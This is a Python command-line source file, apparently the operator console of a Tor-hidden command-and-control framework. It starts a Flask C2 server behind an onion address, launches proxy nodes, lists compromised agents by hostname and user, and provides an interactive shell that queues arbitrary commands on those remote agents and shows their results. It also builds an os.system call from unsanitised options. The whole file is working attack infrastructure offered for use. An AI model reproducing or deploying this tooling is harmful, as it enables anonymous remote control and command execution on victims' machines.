import click
import threading
import time
import os
from server.app import run_server
from utils.tor_manager import TorManager
from server.database import db_session
from server.models import Command, Agent

@click.group()
def cli():
    """Tor C2 Infrastructure Automation"""
    pass

@cli.command()
@click.option('--port', default=5000, help='Port for the Flask server')
@click.option('--tor-port', default=9050, help='Tor SOCKS port')
@click.option('--ctrl-port', default=9051, help='Tor Control port')
def start_c2(port, tor_port, ctrl_port):
    """Start the C2 Server and Tor Hidden Service"""
    
    tm = TorManager(hidden_service_dir='c2_hidden_service', tor_port=tor_port, ctrl_port=ctrl_port, target_port=port)
    try:
        tm.start_tor()
        onion = tm.get_onion_address()
        print(f"\n[+] C2 Hidden Service Available at: http://{onion}")
        
        
        print(f"[+] Starting Flask Server on port {port}...")
        run_server(port=port)
    except KeyboardInterrupt:
        print("\nStopping...")
        tm.stop_tor()

@cli.command()
@click.option('--c2-url', required=True, help='The C2 Onion URL')
@click.option('--port', default=8080, help='Port for the Proxy')
@click.option('--tor-port', default=9050, help='Tor SOCKS port')
def start_proxy(c2_url, port, tor_port):
    """Start a Proxy Node"""
    
    cmd = f"python3 proxy/proxy.py --target {c2_url} --port {port} --tor-port {tor_port}"
    os.system(cmd)

@cli.command()
@click.argument('agent_id')
@click.argument('command')
def queue_command(agent_id, command):
    """Queue a command for an agent"""
    
    from server.database import init_db
    init_db()
    
    cmd = Command(agent_id=agent_id, command=command)
    db_session.add(cmd)
    db_session.commit()
    print(f"[+] Command queued for agent {agent_id}")

@cli.command()
def list_agents():
    """List all registered agents"""
    from server.database import init_db
    init_db()
    
    agents = Agent.query.all()
    for agent in agents:
        print(f"ID: {agent.id} | Host: {agent.hostname} | User: {agent.username} | Last Seen: {agent.last_seen}")

@cli.command()
def shell():
    """Interactive C2 Shell"""
    from server.database import init_db
    init_db()
    
    print("Welcome to C2 Shell. Type 'help' for commands.")
    
    current_agent = None
    
    while True:
        try:
            prompt = f"C2 ({current_agent})> " if current_agent else "C2> "
            cmd_input = input(prompt).strip()
            
            if not cmd_input:
                continue
                
            parts = cmd_input.split()
            cmd = parts[0].lower()
            
            if cmd == 'exit':
                break
            elif cmd == 'help':
                print("Commands:")
                print("  list              - List agents")
                print("  use <agent_id>    - Select an agent")
                print("  back              - Deselect agent")
                print("  exec <command>    - Execute command on selected agent")
                print("  check             - Check for results from selected agent")
                print("  exit              - Exit shell")
            elif cmd == 'list':
                agents = Agent.query.all()
                print(f"{'ID':<20} | {'Hostname':<15} | {'User':<15} | {'Last Seen'}")
                print("-" * 70)
                for a in agents:
                    print(f"{a.id:<20} | {a.hostname:<15} | {a.username:<15} | {a.last_seen}")
            elif cmd == 'use':
                if len(parts) < 2:
                    print("Usage: use <agent_id>")
                    continue
                agent_id = parts[1]
                agent = Agent.query.filter_by(id=agent_id).first()
                if agent:
                    current_agent = agent_id
                    print(f"[*] Interacting with {agent_id}")
                else:
                    print("[!] Agent not found")
            elif cmd == 'back':
                current_agent = None
            elif cmd == 'exec':
                if not current_agent:
                    print("[!] No agent selected. Use 'use <agent_id>' first.")
                    continue
                if len(parts) < 2:
                    print("Usage: exec <command>")
                    continue
                
                command_str = " ".join(parts[1:])
                c = Command(agent_id=current_agent, command=command_str)
                db_session.add(c)
                db_session.commit()
                print(f"[*] Command '{command_str}' queued. ID: {c.id}")
            elif cmd == 'check':
                if not current_agent:
                    print("[!] No agent selected.")
                    continue
                
                
                cmds = Command.query.filter_by(agent_id=current_agent, status='executed').order_by(Command.executed_at.desc()).limit(5).all()
                if not cmds:
                    print("[*] No new results.")
                for c in cmds:
                    print(f"\n[Command ID: {c.id}] {c.command}")
                    print(f"Result:\n{c.output}")
                    print("-" * 30)
            else:
                print("[!] Unknown command")
                
        except KeyboardInterrupt:
            print("\nType 'exit' to quit.")
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == '__main__':
    cli()
